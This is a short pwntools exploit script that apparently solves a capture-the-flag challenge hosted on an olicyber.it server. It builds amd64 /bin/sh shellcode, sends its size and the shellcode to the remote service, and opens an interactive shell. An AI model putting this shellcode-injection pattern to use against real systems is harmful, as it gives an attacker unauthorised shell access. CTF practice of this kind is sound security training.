from pwn import *

exe = ELF('./sw-20')

HOST = 'software-20.challs.olicyber.it'
PORT = 13003

p = process(exe.path)
s = remote(HOST, PORT)

asm_code = shellcraft.amd64.linux.sh()

shellcode = asm(asm_code, arch='x86_64')

s.recvuntil(b'iniziare ...')

s.sendline()

s.recvuntil(b'Shellcode size (max 4096): ')

s.sendline(str(len(shellcode)).encode())

data = s.recv()

s.send(shellcode)
s.interactive()